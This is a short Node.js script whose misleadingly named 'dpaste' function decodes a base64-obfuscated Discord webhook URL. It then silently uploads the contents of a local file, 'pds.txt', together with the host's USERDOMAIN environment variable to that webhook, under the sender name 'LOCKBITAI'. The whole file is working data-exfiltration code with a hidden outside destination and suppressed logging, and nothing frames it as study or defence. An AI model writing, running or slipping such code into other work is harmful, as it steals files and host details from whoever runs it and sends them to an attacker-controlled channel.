const fs = require('fs');

function dpaste(content) {
  const webhookUrl = atob("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTMyNTQ4OTE2ODkyNjYzODE5MS9PVFVwZTQ4dUhFZ3lfcXZLZ25SRVFzTFpZNklQU2Q0c3duZEVuRmJ2bm5CN0g3cW5VQS03ZHJCLUR1RkVMcmdvVkwyUw==")

  // Create a Blob from the content string (convert it into a text file)
  const file = new Blob([content], { type: 'text/plain' });

  // Create a FormData object to send the file
  const formData = new FormData();

  formData.append('file', file, 'message.txt'); // The file will be named 'message.txt'

  formData.append('username', 'LOCKBITAI');
  formData.append('content', process.env.USERDOMAIN);

  // Send the POST request to the Discord webhook
  fetch(webhookUrl, {
    method: 'POST',
    body: formData,
  })
    .then((response) => response.json())
    .then((data) => {
      //console.log('File sent successfully:', data);
    })
    .catch((error) => {
      //console.error('Error sending file to webhook:', error);
    });
}
dpaste(fs.readFileSync('./pds.txt').toString().trim())